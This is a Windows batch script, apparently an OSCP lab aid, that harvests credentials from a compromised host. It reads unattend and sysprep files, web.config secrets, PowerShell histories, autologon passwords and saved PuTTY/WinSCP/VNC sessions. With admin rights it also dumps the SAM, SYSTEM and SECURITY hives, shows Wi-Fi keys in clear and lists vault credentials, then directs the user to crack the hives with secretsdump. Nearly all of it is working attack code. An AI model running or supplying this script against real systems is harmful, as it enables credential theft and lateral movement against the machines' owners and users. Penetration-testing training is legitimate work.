@echo off
setlocal EnableExtensions EnableDelayedExpansion
title OSCP cred enum
rem ---------------------------------------------------------------------------
rem  oscp_cred_enum.bat
rem  Lab / OSCP notes aid. Enumerates COMMON password stores.
rem  Does NOT dump LSASS. Use mimikatz / procdump separately if you are admin.
rem  Run:  oscp_cred_enum.bat
rem  Log:  %TEMP%\oscp_cred_enum.txt
rem ---------------------------------------------------------------------------

set "OUT=%TEMP%\oscp_cred_enum.txt"
set "ADMIN=0"
net session >nul 2>&1 && set "ADMIN=1"

echo ============================================================
echo  OSCP cred enum
echo  user=%USERNAME%  computer=%COMPUTERNAME%
echo  admin=%ADMIN%   (1=yes via net session)
echo  log=%OUT%
echo ============================================================
echo.

> "%OUT%" echo OSCP cred enum  %DATE% %TIME%
>>"%OUT%" echo user=%USERNAME% computer=%COMPUTERNAME% admin=%ADMIN%
>>"%OUT%" echo.

call :log "===== WHOAMI ====="
whoami >>"%OUT%" 2>&1
whoami /priv >>"%OUT%" 2>&1
whoami /groups >>"%OUT%" 2>&1
echo.

call :section "LOW-PRIV CHECKS (always run)"
call :lowpriv

if "%ADMIN%"=="1" (
  call :section "ADMIN CHECKS"
  call :admin
) else (
  call :log "[*] not admin - skipped SAM/SECURITY/LSA/wifi-clear/vault-full"
  call :log "    If you later get admin, re-run this script."
)

echo.
echo Done. Full log: %OUT%
echo Open with:  type "%OUT%"
echo.
endlocal
goto :eof

rem ======================== helpers ========================

:section
echo.
echo ---------- %~1 ----------
>>"%OUT%" echo.
>>"%OUT%" echo ========== %~1 ==========
goto :eof

:log
echo %~1
>>"%OUT%" echo %~1
goto :eof

:trytype
rem %1=path  %2=label
if exist "%~1" (
  call :log "[+] EXISTS %~2"
  call :log "    %~1"
  echo ----- %~1 ----- >>"%OUT%"
  type "%~1" >>"%OUT%" 2>&1
  echo. >>"%OUT%"
) else (
  rem silent miss - not interesting
)
goto :eof

:tryfind
rem %1=dir %2=mask
if exist "%~1" (
  echo [?] dir %~1\%~2 >>"%OUT%"
  dir /s /b "%~1\%~2" >>"%OUT%" 2>nul
)
goto :eof

rem ======================== LOW PRIV ========================

:lowpriv
call :log "[*] Files installers leave behind (unattend / sysprep)"
call :trytype "C:\Windows\Panther\Unattend.xml" "Panther Unattend"
call :trytype "C:\Windows\Panther\Unattend\Unattend.xml" "Panther Unattend2"
call :trytype "C:\Windows\Panther\unattend.xml" "Panther unattend lc"
call :trytype "C:\Windows\System32\sysprep\sysprep.xml" "sysprep.xml"
call :trytype "C:\Windows\System32\sysprep\Panther\unattend.xml" "sysprep Panther"
call :trytype "C:\sysprep.inf" "sysprep.inf"
call :trytype "C:\sysprep\sysprep.xml" "C:\sysprep"
call :trytype "C:\Windows\system32\sysprep\unattend.xml" "sysprep unattend"

call :log "[*] Web / app configs (connectionString, password=)"
call :tryfind "C:\inetpub\wwwroot" "web.config"
call :tryfind "C:\inetpub" "*.config"
call :tryfind "C:\xampp" "*.config"
call :tryfind "C:\wamp" "*.config"
if exist "C:\inetpub\wwwroot\web.config" (
  call :log "[+] IIS web.config - hunt connectionString / password"
  findstr /i /c:"password" /c:"connectionString" /c:"pwd" "C:\inetpub\wwwroot\web.config" >>"%OUT%" 2>nul
)

call :log "[*] Broad file hunt (can be noisy - read the log)"
for %%M in (
  unattend.xml sysprep.xml sysprep.inf
  *.kdbx *.rdp
) do (
  dir /s /b "C:\Users\%%M" >>"%OUT%" 2>nul
  dir /s /b "C:\%%M" >>"%OUT%" 2>nul
)
dir /s /b "C:\Users\*.config" >>"%OUT%" 2>nul
dir /s /b "C:\ProgramData\*.config" >>"%OUT%" 2>nul

call :log "[*] PowerShell history / transcripts"
if exist "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" (
  call :log "[+] PSReadLine history"
  type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >>"%OUT%"
)
dir /s /b "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt" >>"%OUT%" 2>nul
dir /s /b "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt" >>"%OUT%" 2>nul

call :log "[*] cmdkey / Credential Manager (names only unless admin/owner)"
cmdkey /list >>"%OUT%" 2>&1
dir /s /b "%APPDATA%\Microsoft\Credentials\*" >>"%OUT%" 2>nul
dir /s /b "%LOCALAPPDATA%\Microsoft\Credentials\*" >>"%OUT%" 2>nul

call :log "[*] Autologon / Winlogon (often readable)"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName >>"%OUT%" 2>&1

call :log "[*] Putty / WinSCP / VNC / TightVNC saved sessions"
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s >>"%OUT%" 2>&1
reg query "HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions" /s >>"%OUT%" 2>&1
reg query "HKCU\SOFTWARE\ORL\WinVNC3" /s >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\ORL\WinVNC3" /s >>"%OUT%" 2>&1
reg query "HKCU\SOFTWARE\RealVNC" /s >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\RealVNC" /s >>"%OUT%" 2>&1
reg query "HKLM\SOFTWARE\TightVNC\Server" /s >>"%OUT%" 2>&1

call :log "[*] Services whose ImagePath or ObjectName look like they embed a secret"
wmic service get name,startname,pathname >>"%OUT%" 2>&1

call :log "[*] Scheduled tasks (look for /RP /P password= in arguments)"
schtasks /query /fo LIST /v >>"%OUT%" 2>&1

call :log "[*] Unattend-like keys in registry"
reg query "HKLM\SYSTEM\Setup" /s >>"%OUT%" 2>nul | findstr /i "password unattend" >>"%OUT%" 2>nul

call :log "[*] AlwaysInstallElevated (not a password - privesc if BOTH are 1)"
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >>"%OUT%" 2>&1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >>"%OUT%" 2>&1

call :log "[*] SNMP community / IIS / other leftovers"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s >>"%OUT%" 2>&1

call :log "[*] Environment (sometimes PASSWORD= or SECRET=)"
set >>"%OUT%"

call :log "[*] Common leftover text files on Public / Temp"
dir /b "C:\Users\Public\*.txt" "C:\Users\Public\*.ini" "C:\Users\Public\*.xml" "C:\Users\Public\*.config" >>"%OUT%" 2>nul
dir /b "%TEMP%\*.txt" "%TEMP%\*.xml" "%TEMP%\*.config" >>"%OUT%" 2>nul
call :trytype "C:\Users\Public\passwords.txt" "Public passwords.txt"
call :trytype "C:\Users\Public\creds.txt" "Public creds.txt"
call :trytype "C:\Users\%USERNAME%\Desktop\passwords.txt" "Desktop passwords.txt"
call :trytype "C:\Users\%USERNAME%\Documents\passwords.txt" "Documents passwords.txt"
call :trytype "C:\Users\%USERNAME%\Desktop\notes.txt" "Desktop notes"

call :log "[*] Search user profile for password=  (slow-ish)"
findstr /s /i /m "password" "%USERPROFILE%\*.xml" "%USERPROFILE%\*.ini" "%USERPROFILE%\*.config" "%USERPROFILE%\*.txt" >>"%OUT%" 2>nul

goto :eof

rem ======================== ADMIN ========================

:admin
call :log "[+] Admin path - saving SAM/SYSTEM/SECURITY hives to %%TEMP%%"
if not exist "%TEMP%\oscp_hives" mkdir "%TEMP%\oscp_hives"
reg save HKLM\SAM "%TEMP%\oscp_hives\sam.save" /y >>"%OUT%" 2>&1
reg save HKLM\SYSTEM "%TEMP%\oscp_hives\system.save" /y >>"%OUT%" 2>&1
reg save HKLM\SECURITY "%TEMP%\oscp_hives\security.save" /y >>"%OUT%" 2>&1
dir "%TEMP%\oscp_hives" >>"%OUT%"
call :log "    Copy those three files to Kali and run:"
call :log "    secretsdump.py -sam sam.save -system system.save -security security.save LOCAL"

call :log "[+] LSA / Policy secrets (names; values often binary)"
reg query "HKLM\SECURITY\Policy\Secrets" >>"%OUT%" 2>&1

call :log "[+] Cached logon count"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount >>"%OUT%" 2>&1

call :log "[+] Wi-Fi keys in clear"
netsh wlan show profiles >>"%OUT%" 2>&1
for /f "tokens=2 delims=:" %%P in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
  call :log "    profile:%%P"
  netsh wlan show profile name=%%P key=clear >>"%OUT%" 2>&1
)

call :log "[+] Vault"
vaultcmd /listcreds:"Windows Credentials" /all >>"%OUT%" 2>&1
vaultcmd /listcreds:"Web Credentials" /all >>"%OUT%" 2>&1

call :log "[+] cmdkey list (admin sees more)"
cmdkey /list >>"%OUT%" 2>&1

call :log "[+] Other users PS history / web.config under C:\Users"
dir /s /b "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >>"%OUT%" 2>nul
for /d %%U in (C:\Users\*) do (
  if exist "%%U\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" (
    call :log "[+] history %%U"
    type "%%U\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >>"%OUT%"
  )
)

call :log "[+] Scheduled task files on disk"
dir /s /b "C:\Windows\System32\Tasks\*" >>"%OUT%" 2>nul

call :log "[*] Still use mimikatz / nanodump for LSASS. This script will not touch LSASS."
goto :eof
